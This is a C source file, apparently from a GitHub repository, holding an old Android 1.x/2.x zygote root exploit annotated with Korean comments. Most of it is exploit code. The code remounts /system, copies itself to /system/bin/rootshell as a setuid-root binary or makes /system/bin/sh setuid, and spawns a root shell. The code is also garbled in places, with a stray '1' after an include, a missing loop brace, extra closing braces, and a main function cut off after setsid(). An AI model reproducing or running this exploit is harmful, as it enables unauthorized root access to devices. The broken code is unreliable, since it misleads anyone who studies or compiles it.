https://raw.githubusercontent.com/mobilesec/android-gainroot/master/exploits/exploit3_zygote.c

/* Android 1.x/2.x zygote exploit (C) 2009-2010 The Android Exploid Crew */

//
안드로이드 1.x. 2.x 익스플로잇 코드입니다.
취약점 발생 원인은 exe로된 코드 바이너리를 /system/bin/rootshell에 복사해서 
리마운트 시킬 때 적용되는 파일 시스템 정보를 갱신함으로써 리마운트시
루트쉘이 획득되는 간단한 동작의 결함에 대한 팁입니다.

--
상세:
zygote는 /system을 리마운트하고, exe(쉘코드)를 /system/bin/rootshell로 복사해서 
권한 상승된 조건으로 /system/bin/rootshell을 chmod로 4755로 설정해서 실행해서 권한 
상승 쉘을 실행하는 문제네요. 리마운트할 때 zygote 데몬이 해당 폴더의 퍼미션을 줄 수 있는 
문제로 인해 발생하는 취약점입니다.
--


너무 어렵게만 생각하시지 마시고, 대충 넘어가셔도 될 거 같네요.
꾸준히 살펴 보시면 좀 더 내용을 정리 할 수 있겠네요.

방법 동작 일과:
(1) /proc/self/exe 파일을 /system/bin/rootshell로 복사해서 파일 시스템을 리마운트해서 쉘을 띄울 수 있는 결함도 있음.


#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>1
#include <errno.h>
#include <sys/types.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/mount.h>

// 환경 변수 포인터 정의.
extern char **environ;

// 프로세스 종료 함수 선언.
void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


// 파일 복사 함수 (copy from to to).
int copy(const char *from, const char *to)
{
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	// fd1 = 읽기전용 파일로 읽기
                // fd2 = 파일 생성용 만륾.
	if ((fd1 = open(from, O_RDONLY)) < 0)
		return -1;
	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf)); // 파일일 읽어서 안 읽어지면 코드 브레이크.
		if (r <= 0)
			break;
		if (write(fd2, buf, r) != r) // 읽어지는게 있으면 buf 변수(읽은 내용)을 fd2(생성된 파일에 저장 후 코드 브레이크.
			break;
	}

	close(fd1);
	close(fd2);
	sync(); sync();
	return r;
}


// 루트쉘 실행 함수. uid가 2000(AID_SHELL)이 아닐 경우 setuid(0), setgid(0) 설정해서 /system/bin/sh를 띄워 루트 쉘을 획득 하는 함수.
void rootshell(char **env)
{
	char *sh[] = {"/system/bin/sh", 0};

	// AID_SHELL
	if (getuid() != 2000)
		die("[-] Permission denied.");

	setuid(0); setgid(0);
	execve(*sh, sh, env);
	die("[-] execve");
}


// 시스템 리마운트 함수.
// 아래 함수처럼 재마운트를 하는 경우에 루트쉘이 획득되는 함수입니다.
int remount_system(const char *mntpoint)
{
	FILE *f = NULL;
	int found = 0;
	char buf[1024], *dev = NULL, *fstype = NULL;

	// /proc/mounts를 읽기 전용으로 읽음.
	if ((f = fopen("/proc/mounts", "r")) == NULL)
		return -1;

	// 버퍼 초기화.
	memset(buf, 0, sizeof(buf));

	// 파일 끝까지 반복.
	for (;!feof(f);) 
		if (fgets(buf, sizeof(buf), f) == NULL) // 버퍼 읽고 코드 브레이크.
			break;
		if (strstr(buf, mntpoint)) { // 마운트 포인트가 있으면 found = 1 설정후 코드 브레이크.
			found = 1;
			break;
		}
	}
	fclose(f);

               // 마운트 정보가 있을 시.
               // \t 을 기준으로 문자열을 잘라서 dev, fstype 두 변수에 해당하는 정보를 구해서 설정.
	if (!found)
		return -1;
	if ((dev = strtok(buf, " \t")) == NULL) // dev 끊기.
		return -1;
	if (strtok(NULL, " \t") == NULL) // 중간 설정 값 끊기.
		return -1;
	if ((fstype = strtok(NULL, " \t")) == NULL) // fstype 끊기.
		return -1;

                // 리마운트. (dev 현재 디바이스)
	return mount(dev, mntpoint, fstype, MS_REMOUNT, 0); // MS_REMOUNT 옵션으로 재마운트. (루트쉘 획득).
}

// 루트쉘 공격하는 취약점 트리거 함수.
// 아래 코드를 분석하면 취약점 발생 원인을 알 수 있다.
// 다음 시간으로 미룸.

void root()
{
	int i = 0, me = getpid(), fd = -1;
	char buf[256];

	for (i = 0; i < me; ++i) {
		snprintf(buf, sizeof(buf), "/proc/%d/status", i);
		if ((fd = open(buf, O_RDONLY)) < 0)
			continue;
		memset(buf, 0, sizeof(buf));
		if (read(fd, buf, 42) < 0)
			continue;
		if (strstr(buf, "libjailbreak.so"))
			kill(i, SIGKILL);
		close(fd);
	}

	remount_system("/system"); // /system 디렉토리를 리마운트.
	if (copy("/proc/self/exe", "/system/bin/rootshell") != 0) // /proc/self/exe(현재 익스플로잇 바이너리)를 /system/bin/rootshell로 복사.
		chmod("/system/bin/sh", 04755); // 복사가 안되면 /system/bin/sh를 4755로 설정.
	else
		chmod("/system/bin/rootshell", 04711); // 복사가 성공이면 /system/bin/rootshell을 4711로 설정. (공격 코드 재 실행시 루트쉘이 실행됨).
	exit(0);
}


// 메인 엔트리 함수:
int main()
{
	pid_t p;

                // AID_SHELL 권한이 아니어서 setuid, setgid로 0 설정 되면
                // getuid, geteuid 가 0 (수퍼 유저)이 읽어져서 rootshell(environ) 을 통해 루트쉘 획득.
	if (getuid() && geteuid() == 0)
		rootshell(environ);
	else if (geteuid() == 0) // euid가 0이면 root 함수 호출.
		root();

	if (fork() > 0) { // 프로세스 1개 생성.
		exit(0); // 종료.
	}

                // sid(보안 식별자) 설정.
	setsid();

	}

	return 0;
}



